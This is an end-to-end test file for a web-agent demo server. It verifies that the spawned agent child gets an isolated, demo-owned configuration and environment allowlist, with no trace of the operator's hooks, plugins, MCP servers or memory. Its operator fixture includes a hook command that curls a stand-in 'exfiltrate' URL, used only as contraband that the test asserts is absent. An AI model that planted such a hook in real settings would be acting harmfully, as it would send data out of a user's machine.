/**
 * The demo agent's child runs in a configuration the demo owns (APRV-177) —
 * the second walk over `examples/web-agent-demo/server.mjs`.
 *
 * `tests/e2e-web-agent-demo.test.ts` walks the gate: an attendee submits, the
 * agent registers and requests, a phone decides. This file walks the thing that
 * happens before any of that, and that a rehearsal on 2026-08-31 caught the
 * server getting wrong: the child was handed the operator's `HOME`, so their
 * installed plugins, their connected MCP servers, their user memory, their
 * slash commands and their hooks all loaded into the session an attendee types
 * prompts at. `--allowedTools mcp__approval__*` stopped any of it being used
 * silently. It did not stop it being there, and a demo whose child is the
 * operator's own laptop is a demo that behaves differently on every machine and
 * puts a personal setup on a projector.
 *
 * **What stands in for `claude`, and why it can prove anything at all.** The
 * probe this test writes into the scratch directory is not a stub that reports
 * what it was told to report. It performs, with the environment and the argv it
 * was actually given, the same discovery a real client performs — the config
 * directory from `CLAUDE_CONFIG_DIR` (else `$HOME/.claude`), the settings files
 * in it and the one named by `--settings`, the user memory in it and in
 * `$HOME/.claude`, the project memory found by walking up from its working
 * directory, the MCP servers from `--mcp-config` merged with the user and
 * project scopes unless `--strict-mcp-config` forbids it, and the plugins and
 * slash commands on disk. Then it emits that as a stream-json `init` line, the
 * way the real binary does. So the assertions below read a session init that
 * was computed from the spawn contract this server writes, and a change to that
 * contract moves them.
 *
 * The operator fixture is deliberately loud: a `PreToolUse` hook that would run
 * a shell command, two connected MCP servers, a user memory file, two plugins
 * and a slash command, all in a scratch `HOME` the server is started with. None
 * of it may appear.
 *
 * The walk also runs the demo's own `read_the_gate` template end to end under
 * that isolated configuration (AC3): the probe calls `status`, `queue` and
 * `log tail` through the real CLI, the task finishes green, and the log gains
 * nothing, because reads write nothing.
 */

import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

/** dist/tests/… -> dist/src/cli/main.js */
const CLI_ENTRY = fileURLToPath(new URL("../src/cli/main.js", import.meta.url));
/** dist/tests/… -> <repo>/examples/web-agent-demo/server.mjs (not built; run as-is). */
const SERVER_ENTRY = fileURLToPath(
  new URL("../../examples/web-agent-demo/server.mjs", import.meta.url),
);

const HUMAN = "human:demo";
/** The read-only template: no declared action, so nothing to approve. */
const TEMPLATE = "read_the_gate";

/** The one credential the demo supports, and the value the child must receive. */
const OAUTH_TOKEN = "sk-ant-oat01-fake-token-for-the-isolation-walk-DO-NOT-USE";

/**
 * Trimmed from `examples/web-agent-demo/provisioning.md` to the one class this
 * walk touches. `read.*` is autonomous, which is the whole of beat 1.
 */
const POLICY = [
  "# Approval policy — web-agent demo gate (isolation twin)",
  "",
  "```yaml approval-policy",
  'version: "0.1"',
  "defaults:",
  "  autonomy: manual",
  "  channel: telegram",
  '  approval_ttl: "10m"',
  "  on_expiry: reject",
  "  token_delivery: sealed",
  "classes:",
  "  read.*:",
  "    autonomy: autonomous",
  "  exec.local:",
  "    autonomy: manual",
  "channels:",
  "  telegram:",
  "    token_env: APPROVAL_TG_TOKEN",
  "    chat_id_env: APPROVAL_TG_CHAT",
  "```",
  "",
].join("\n");

// ---------------------------------------------------------------------------
// The scratch world: an operator's home, and a demo instance outside it
// ---------------------------------------------------------------------------

/** realpath: macOS hands out /var/… symlinks, and every assertion here is a path. */
const scratch = realpathSync(mkdtempSync(join(tmpdir(), "approval-md-e2e-demo-isolation-")));
/** The operator's personal configuration. Everything in it is contraband. */
const operatorHome = join(scratch, "operator-home");
/** The demo instance, deliberately NOT under the operator's home. */
const demo = join(scratch, "demo-gate");
const probe = join(scratch, "probe-claude.mjs");
/** Where the probe records what it saw. Baked into its source, not passed in env. */
const observed = join(scratch, "observed.json");

const OPERATOR_HOOK_COMMAND = "curl https://operator.example.invalid/exfiltrate";
const OPERATOR_MEMORY_MARK = "OPERATOR-ONLY MEMORY, MUST NOT REACH THE DEMO CHILD";

/** An operator's `HOME`, as personal as a real one and just as loud. */
function writeOperatorHome(): void {
  const dotClaude = join(operatorHome, ".claude");
  mkdirSync(join(dotClaude, "plugins"), { recursive: true });
  mkdirSync(join(dotClaude, "commands"), { recursive: true });
  writeFileSync(
    join(dotClaude, "settings.json"),
    `${JSON.stringify(
      {
        hooks: {
          PreToolUse: [
            { matcher: "*", hooks: [{ type: "command", command: OPERATOR_HOOK_COMMAND }] },
          ],
        },
        enabledPlugins: { vercel: true, "frontend-design": true },
      },
      null,
      2,
    )}\n`,
    "utf8",
  );
  writeFileSync(join(dotClaude, "CLAUDE.md"), `# ${OPERATOR_MEMORY_MARK}\n`, "utf8");
  writeFileSync(
    join(dotClaude, "plugins", "config.json"),
    `${JSON.stringify({ installed: ["vercel", "frontend-design"] }, null, 2)}\n`,
    "utf8",
  );
  writeFileSync(join(dotClaude, "commands", "deploy.md"), "# /deploy — the operator's\n", "utf8");
  writeFileSync(
    join(operatorHome, ".claude.json"),
    `${JSON.stringify(
      {
        mcpServers: {
          airtable: { command: "npx", args: ["-y", "airtable-mcp"] },
          perplexity: { command: "npx", args: ["-y", "perplexity-mcp"] },
        },
      },
      null,
      2,
    )}\n`,
    "utf8",
  );
}

// ---------------------------------------------------------------------------
// The probe that stands in for `claude -p`
// ---------------------------------------------------------------------------

/**
 * A `claude` that discovers its own configuration and says what it found.
 *
 * Everything it reports is read from disk with the environment it was handed:
 * nothing is echoed back from a fixture. It writes the whole picture to
 * {@link observed} for the assertions, emits the `init` line a real client
 * emits, and then does beat 1's work — `status`, `queue`, `log tail` through
 * the real CLI — so the same run proves the isolated configuration is one the
 * demo can actually run under.
 */
function probeSource(): string {
  return [
    "#!/usr/bin/env node",
    "// Written by tests/e2e-web-agent-demo-isolation.test.ts. It discovers, it",
    "// does not pretend: every path below is resolved from this process's own",
    "// environment and argv, and read from the filesystem as it finds it.",
    'import { spawnSync } from "node:child_process";',
    'import { existsSync, readFileSync, readdirSync, writeFileSync } from "node:fs";',
    'import { dirname, join } from "node:path";',
    "",
    `const CLI = ${JSON.stringify(CLI_ENTRY)};`,
    `const OBSERVED = ${JSON.stringify(observed)};`,
    "",
    "const argv = process.argv.slice(2);",
    "function flag(name) {",
    "  const at = argv.indexOf(name);",
    "  return at === -1 ? null : (argv[at + 1] ?? null);",
    "}",
    "",
    "const home = process.env.HOME ?? null;",
    "const configDir = process.env.CLAUDE_CONFIG_DIR ?? (home === null ? null : join(home, '.claude'));",
    "",
    "function readJson(path) {",
    "  if (path === null || !existsSync(path)) return null;",
    "  try {",
    "    return JSON.parse(readFileSync(path, 'utf8'));",
    "  } catch {",
    "    return null;",
    "  }",
    "}",
    "function listing(path) {",
    "  if (path === null || !existsSync(path)) return [];",
    "  try {",
    "    return readdirSync(path).sort();",
    "  } catch {",
    "    return [];",
    "  }",
    "}",
    "",
    "// Settings, the way a client layers them: the config directory's own file,",
    "// then the one named on the command line.",
    "const settingsPaths = [];",
    "if (configDir !== null && existsSync(join(configDir, 'settings.json'))) {",
    "  settingsPaths.push(join(configDir, 'settings.json'));",
    "}",
    "const namedSettings = flag('--settings');",
    "if (namedSettings !== null && existsSync(namedSettings) && !settingsPaths.includes(namedSettings)) {",
    "  settingsPaths.push(namedSettings);",
    "}",
    "const settings = settingsPaths.map((path) => readJson(path) ?? {});",
    "const hooks = [];",
    "for (const entry of settings) {",
    "  for (const [event, matchers] of Object.entries(entry.hooks ?? {})) {",
    "    for (const matcher of matchers ?? []) {",
    "      for (const hook of matcher.hooks ?? []) hooks.push(`${event}:${hook.command ?? ''}`);",
    "    }",
    "  }",
    "}",
    "const plugins = [];",
    "for (const entry of settings) {",
    "  for (const [name, on] of Object.entries(entry.enabledPlugins ?? {})) {",
    "    if (on !== false) plugins.push(name);",
    "  }",
    "}",
    "for (const name of (readJson(configDir === null ? null : join(configDir, 'plugins', 'config.json'))?.installed ?? [])) {",
    "  if (!plugins.includes(name)) plugins.push(name);",
    "}",
    "",
    "// Memory: the config directory's, the home directory's, and the project",
    "// memory a client finds by walking up from the working directory.",
    "const memoryPaths = [];",
    "for (const candidate of [",
    "  configDir === null ? null : join(configDir, 'CLAUDE.md'),",
    "  home === null ? null : join(home, '.claude', 'CLAUDE.md'),",
    "]) {",
    "  if (candidate !== null && existsSync(candidate)) memoryPaths.push(candidate);",
    "}",
    "let walk = process.cwd();",
    "for (;;) {",
    "  const candidate = join(walk, 'CLAUDE.md');",
    "  if (existsSync(candidate) && !memoryPaths.includes(candidate)) memoryPaths.push(candidate);",
    "  const parent = dirname(walk);",
    "  if (parent === walk) break;",
    "  walk = parent;",
    "}",
    "",
    "// MCP servers: the file on the command line, plus the user and project",
    "// scopes UNLESS --strict-mcp-config says the command line is the whole list.",
    "const strict = argv.includes('--strict-mcp-config');",
    "const mcpServers = Object.keys(readJson(flag('--mcp-config'))?.mcpServers ?? {});",
    "if (!strict) {",
    "  for (const source of [",
    "    home === null ? null : join(home, '.claude.json'),",
    "    join(process.cwd(), '.mcp.json'),",
    "  ]) {",
    "    for (const name of Object.keys(readJson(source)?.mcpServers ?? {})) {",
    "      if (!mcpServers.includes(name)) mcpServers.push(name);",
    "    }",
    "  }",
    "}",
    "",
    "const slashCommands = [",
    "  ...listing(configDir === null ? null : join(configDir, 'commands')),",
    "  ...listing(home === null ? null : join(home, '.claude', 'commands')),",
    "];",
    "",
    "const init = {",
    "  type: 'system',",
    "  subtype: 'init',",
    "  session_id: 'probe-claude',",
    "  cwd: process.cwd(),",
    "  mcp_servers: mcpServers.map((name) => ({ name, status: 'connected' })),",
    "  slash_commands: slashCommands,",
    "  plugins,",
    "  hooks,",
    "  memory_paths: memoryPaths,",
    "};",
    "writeFileSync(",
    "  OBSERVED,",
    "  `${JSON.stringify({ argv, env: process.env, config_dir: configDir, settings_paths: settingsPaths, init }, null, 2)}\\n`,",
    ");",
    "",
    "function emit(event) {",
    "  process.stdout.write(`${JSON.stringify(event)}\\n`);",
    "}",
    "emit(init);",
    "",
    "// Beat 1 under the isolated configuration: three reads, through the real CLI.",
    "let uses = 0;",
    "function readVerb(name, args) {",
    "  uses += 1;",
    "  const id = `toolu_${uses}`;",
    "  emit({",
    "    type: 'assistant',",
    "    message: { content: [{ type: 'tool_use', id, name: `mcp__approval__${name}`, input: { positionals: [], flags: { '--json': true } } }] },",
    "  });",
    "  const result = spawnSync(process.execPath, [CLI, ...args], {",
    "    cwd: process.cwd(),",
    "    encoding: 'utf8',",
    "    env: { PATH: process.env.PATH ?? '', HOME: process.env.HOME ?? '', NO_COLOR: '1' },",
    "  });",
    "  const text = String(result.stdout ?? '').trim() || String(result.stderr ?? '').trim();",
    "  emit({",
    "    type: 'user',",
    "    message: { content: [{ type: 'tool_result', tool_use_id: id, content: [{ type: 'text', text }], is_error: false }] },",
    "  });",
    "  return text;",
    "}",
    "readVerb('status', ['status', '--json']);",
    "readVerb('queue', ['queue', '--json']);",
    "readVerb('log_tail', ['log', 'tail', '-n', '10', '--json']);",
    "emit({",
    "  type: 'result',",
    "  subtype: 'success',",
    "  result: 'The gate is attested, nothing is pending, and I took no action.',",
    "  is_error: false,",
    "});",
    "process.exit(0);",
    "",
  ].join("\n");
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

interface Run {
  code: number;
  stdout: string;
  stderr: string;
}

/** The CLI, run against the demo instance with no identity it was not given. */
function runCli(args: string[], extra: Record<string, string> = {}): Run {
  const env: NodeJS.ProcessEnv = { ...process.env, HOME: operatorHome, ...extra };
  for (const name of [
    "APPROVAL_HUMAN",
    "APPROVAL_AGENT",
    "APPROVAL_TG_TOKEN",
    "APPROVAL_TG_CHAT",
    "APPROVAL_VAULT_PASSPHRASE",
    "CLAUDE_CONFIG_DIR",
    "CLAUDE_CODE_OAUTH_TOKEN",
  ]) {
    if (extra[name] === undefined) delete env[name];
  }
  const result = spawnSync(process.execPath, [CLI_ENTRY, ...args], {
    cwd: demo,
    encoding: "utf8",
    env,
  });
  assert.equal(result.error, undefined, `spawn failed: ${String(result.error)}`);
  return { code: result.status ?? -1, stdout: result.stdout, stderr: result.stderr };
}

function pause(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function until(predicate: () => boolean, label: string, ms = 60_000): Promise<void> {
  const deadline = Date.now() + ms;
  while (Date.now() < deadline) {
    if (predicate()) return;
    await pause(25);
  }
  assert.fail(`timed out waiting for ${label}`);
}

async function untilAsync(
  predicate: () => Promise<boolean>,
  label: string,
  ms = 60_000,
): Promise<void> {
  const deadline = Date.now() + ms;
  while (Date.now() < deadline) {
    if (await predicate()) return;
    await pause(100);
  }
  assert.fail(`timed out waiting for ${label}`);
}

/** A port nothing is listening on. The server refuses port 0 by design. */
function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const socket = createServer();
    socket.on("error", reject);
    socket.listen(0, "127.0.0.1", () => {
      const port = (socket.address() as AddressInfo).port;
      socket.close(() => resolve(port));
    });
  });
}

interface Observed {
  argv: string[];
  env: Record<string, string>;
  config_dir: string;
  settings_paths: string[];
  init: {
    cwd: string;
    mcp_servers: { name: string }[];
    slash_commands: string[];
    plugins: string[];
    hooks: string[];
    memory_paths: string[];
  };
}

// ===========================================================================
// The walk
// ===========================================================================

test("the demo agent's child gets the demo's configuration, not the operator's", async () => {
  let base = "";
  let serverOut = "";
  let serverErr = "";
  let server: ReturnType<typeof spawn> | null = null;

  async function get(path: string): Promise<Record<string, unknown>> {
    const response = await fetch(`${base}${path}`);
    return (await response.json()) as Record<string, unknown>;
  }

  try {
    // -----------------------------------------------------------------------
    // (a) the world: an operator with a very personal laptop, and a demo
    // instance that is none of their business.
    writeOperatorHome();
    mkdirSync(demo, { recursive: true });
    writeFileSync(probe, probeSource(), "utf8");
    chmodSync(probe, 0o755);

    const scaffolded = runCli(["init", "--json"]);
    assert.equal(scaffolded.code, 0, scaffolded.stderr);
    writeFileSync(join(demo, "APPROVAL.md"), POLICY, "utf8");
    const attested = runCli(["policy", "attest", "--as", HUMAN, "--json"]);
    assert.equal(attested.code, 0, attested.stderr);

    // -----------------------------------------------------------------------
    // (b) the server, started the way the runbook starts it — from a shell that
    // holds the operator's HOME, their config directory, and the one credential
    // the demo is supposed to forward.
    const port = await freePort();
    base = `http://127.0.0.1:${port}`;
    const serverEnv: NodeJS.ProcessEnv = {
      ...process.env,
      HOME: operatorHome,
      CLAUDE_BIN: probe,
      CLAUDE_CONFIG_DIR: join(operatorHome, ".claude"),
      CLAUDE_CODE_OAUTH_TOKEN: OAUTH_TOKEN,
      // A CLAUDE_*-named variable that is not a credential: it used to travel
      // on the prefix rule, and it must not travel on the allowlist.
      CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "0",
      ANTHROPIC_CUSTOM_HEADERS: "x-operator: yes",
    };
    for (const name of [
      "APPROVAL_HUMAN",
      "APPROVAL_TG_TOKEN",
      "APPROVAL_TG_CHAT",
      "APPROVAL_VAULT_PASSPHRASE",
      // The API-key alternative to the token above. Whether the machine running
      // this suite happens to have one set must not change what (f) sees.
      "ANTHROPIC_API_KEY",
      "ANTHROPIC_AUTH_TOKEN",
      "ANTHROPIC_BASE_URL",
      "ANTHROPIC_MODEL",
    ]) {
      delete serverEnv[name];
    }
    server = spawn(process.execPath, [SERVER_ENTRY, "--dir", demo, "--port", String(port)], {
      cwd: demo,
      env: serverEnv,
      stdio: ["ignore", "pipe", "pipe"],
    });
    server.stdout?.setEncoding("utf8");
    server.stderr?.setEncoding("utf8");
    server.stdout?.on("data", (chunk: string) => {
      serverOut += chunk;
    });
    server.stderr?.on("data", (chunk: string) => {
      serverErr += chunk;
    });
    await until(() => serverOut.includes("task desk on http://"), "the demo server to listen");
    assert.equal(serverErr, "", `the server warned at startup: ${serverErr}`);

    // The banner says where the child's world is, and that it has a credential.
    const agentHome = join(demo, "agent-home");
    const configDir = join(agentHome, "claude-config");
    assert.match(serverOut, new RegExp(`agent home: +${agentHome}`, "u"));
    assert.match(serverOut, /agent auth: +CLAUDE_CODE_OAUTH_TOKEN/u);

    // The generated config directory holds the demo's two files and nothing
    // else it did not write.
    const settings = JSON.parse(readFileSync(join(configDir, "settings.json"), "utf8")) as {
      hooks: Record<string, unknown>;
      enabledPlugins: Record<string, unknown>;
      enableAllProjectMcpServers: boolean;
    };
    assert.deepEqual(settings.hooks, {});
    assert.deepEqual(settings.enabledPlugins, {});
    assert.equal(settings.enableAllProjectMcpServers, false);
    assert.match(readFileSync(join(configDir, "CLAUDE.md"), "utf8"), /approval\.md demo agent/u);

    // -----------------------------------------------------------------------
    // (c) one attendee, the read-only template, run to completion (AC3).
    const submitted = await fetch(`${base}/api/task`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ template_id: TEMPLATE }),
    });
    assert.equal(submitted.status, 202);
    const taskId = String(((await submitted.json()) as Record<string, unknown>)["id"]);

    await untilAsync(async () => {
      const view = await get(`/api/task/${taskId}`);
      return view["state"] === "done" || view["state"] === "failed";
    }, "the agent run to finish");
    const finished = await get(`/api/task/${taskId}`);
    assert.equal(finished["state"], "done", JSON.stringify(finished["note"]));
    assert.equal(finished["exit_code"], 0);

    // The three reads happened and the run said so.
    const entries = finished["entries"] as { kind: string; tool?: string; text: string }[];
    assert.deepEqual(
      entries.filter((entry) => entry.kind === "tool_use").map((entry) => entry.tool),
      ["mcp__approval__status", "mcp__approval__queue", "mcp__approval__log_tail"],
    );
    const results = entries.filter((entry) => entry.kind === "tool_result");
    assert.equal(results.length, 3);
    assert.ok(
      results.every((entry) => entry.text.startsWith("{")),
      `a read verb produced no JSON under the isolated config: ${JSON.stringify(results)}`,
    );
    assert.ok(entries.some((entry) => entry.kind === "result"));

    // Reads write nothing: the log still holds only the attestation.
    const tailed = runCli(["log", "tail", "-n", "20", "--json"]);
    assert.equal(tailed.code, 0, tailed.stderr);
    const records = (JSON.parse(tailed.stdout) as { records: { event: string }[] }).records;
    assert.deepEqual(
      records.map((record) => record.event),
      ["policy.updated"],
    );

    // -----------------------------------------------------------------------
    // (d) AC1: the session init, computed by the probe from the environment and
    // argv it was actually handed. Nothing of the operator's is in it.
    const seen = JSON.parse(readFileSync(observed, "utf8")) as Observed;

    assert.deepEqual(seen.init.hooks, [], "an operator hook reached the child's session");
    assert.deepEqual(seen.init.plugins, [], "an operator plugin reached the child's session");
    assert.deepEqual(seen.init.slash_commands, [], "an operator slash command reached the child");
    assert.deepEqual(
      seen.init.mcp_servers.map((entry) => entry.name),
      ["approval"],
      "the child's session had an MCP server that is not the gate's",
    );
    assert.deepEqual(
      seen.init.memory_paths,
      [join(configDir, "CLAUDE.md")],
      "the child's memory is not exactly the demo's own file",
    );
    for (const path of seen.init.memory_paths) {
      assert.ok(
        path.startsWith(demo + "/"),
        `the child loaded memory from outside the demo instance: ${path}`,
      );
      assert.equal(readFileSync(path, "utf8").includes(OPERATOR_MEMORY_MARK), false);
    }
    const initText = JSON.stringify(seen.init);
    for (const contraband of [operatorHome, OPERATOR_HOOK_COMMAND, "airtable", "perplexity", "vercel"]) {
      assert.equal(
        initText.includes(contraband),
        false,
        `the session init named ${contraband}`,
      );
    }

    // -----------------------------------------------------------------------
    // (e) the spawn contract itself: a demo-owned home, a demo-owned config
    // directory, one MCP config declared strictly, and the demo's settings.
    assert.equal(seen.env["HOME"], agentHome);
    assert.equal(seen.env["CLAUDE_CONFIG_DIR"], configDir);
    assert.equal(seen.config_dir, configDir);
    assert.deepEqual(seen.settings_paths, [join(configDir, "settings.json")]);
    assert.ok(seen.argv.includes("--strict-mcp-config"), "--strict-mcp-config was not passed");
    assert.equal(seen.argv[seen.argv.indexOf("--settings") + 1], join(configDir, "settings.json"));
    assert.equal(seen.argv[seen.argv.indexOf("--mcp-config") + 1], join(demo, "tasks", "mcp-config.json"));
    assert.equal(seen.argv[seen.argv.indexOf("--allowedTools") + 1], "mcp__approval__*");
    for (const name of ["XDG_CONFIG_HOME", "XDG_CACHE_HOME", "XDG_DATA_HOME"]) {
      assert.ok(
        String(seen.env[name] ?? "").startsWith(agentHome),
        `${name} did not point inside the demo's home`,
      );
    }

    // -----------------------------------------------------------------------
    // (f) the environment allowlist: the credential crossed, and nothing else
    // did — not the operator's config directory, not a CLAUDE_*-named setting,
    // not an ANTHROPIC_*-named one, not the shell.
    assert.equal(seen.env["CLAUDE_CODE_OAUTH_TOKEN"], OAUTH_TOKEN);
    assert.deepEqual(
      // `__CF_USER_TEXT_ENCODING` is macOS's own, added below this server by
      // the C library; every name the server chooses is in the list below.
      Object.keys(seen.env)
        .filter((name) => !name.startsWith("__"))
        .sort(),
      [
        "CLAUDE_CODE_OAUTH_TOKEN",
        "CLAUDE_CONFIG_DIR",
        "HOME",
        "NO_COLOR",
        "PATH",
        "XDG_CACHE_HOME",
        "XDG_CONFIG_HOME",
        "XDG_DATA_HOME",
      ],
      "the child's environment is not exactly the eight names the server declares",
    );
  } finally {
    server?.kill("SIGKILL");
    rmSync(scratch, { recursive: true, force: true });
  }
});

// A guard for the walk's own premise: the fixture home really is outside the
// instance, so an ancestor CLAUDE.md cannot make (d) pass by accident.
test("the isolation walk's fixture keeps the operator's home out of the instance's ancestry", () => {
  let dir = dirname(demo);
  const ancestors: string[] = [];
  for (;;) {
    ancestors.push(dir);
    const parent = dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  assert.equal(ancestors.includes(operatorHome), false);
});
